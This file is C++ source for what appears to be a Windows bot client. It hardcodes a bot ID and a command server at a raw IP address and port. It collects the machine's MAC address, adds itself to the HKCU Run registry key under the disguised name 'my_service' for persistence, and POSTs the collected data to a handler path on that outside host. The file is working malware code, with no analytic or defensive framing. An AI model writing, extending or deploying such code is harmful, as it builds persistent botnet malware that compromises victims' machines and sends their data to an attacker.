#include "lib\DataCollector.h"
#include "lib\UtilLib.h"
#include <tchar.h>
#pragma comment(lib, "advapi32")
#include <string>
#include <windows.h>
#include <iostream>
#include "lib\ActionController.h"
#include <wchar.h>
#include "lib\HttpLib.h"
#include "lib\ThreadController.h"

int addRunEntry();

#if defined(THREADING)
ThreadController tc;
#endif
char *BOT_ID = "jOAjQ9HDVwpFvAXj7FccKeoFKvm48sSm";
int COUNT = 3;
int WAIT = 1;
DataCollector dc;
#define EXECUTE
string url = "104.39.3.120";
int port = 50000;
#ifdef ENCODE_HTTP
bool encode = true;
#else
bool encode = false;
#endif
#define REQ_COUNT
vector<vector<string>> requestQueue;
#define RUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define FREQUENCY

using namespace std;

int main(){
#if defined(BOTLOOP) || defined(EXECUTE)
char* MAC_ADDR = getMAC();
dc.addDataPair("bot_id", BOT_ID);
dc.addDataPair("mac_address", MAC_ADDR);
#endif
addRunEntry();

#ifdef EXECUTE
sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData());
dc.dumpCollectedData();
#endif
#if defined THREADING
tc.closeAllThreads();
#endif
}

int addRunEntry()
{
CHAR path[MAX_PATH];
int bytes = GetModuleFileNameA(NULL, path, MAX_PATH);
	int size = strlen(path) + 1;
	HKEY newValue;
	if (RegOpenKey(HKEY_CURRENT_USER,TEXT(RUN_KEY),&newValue) != ERROR_SUCCESS) {return -1;}
	if (RegSetValueEx(newValue,TEXT("my_service"),0,REG_SZ,(LPBYTE)path,MAX_PATH) != ERROR_SUCCESS){
		RegCloseKey(newValue);
		return -1;
	}
	RegCloseKey(newValue);
	return TRUE;
}
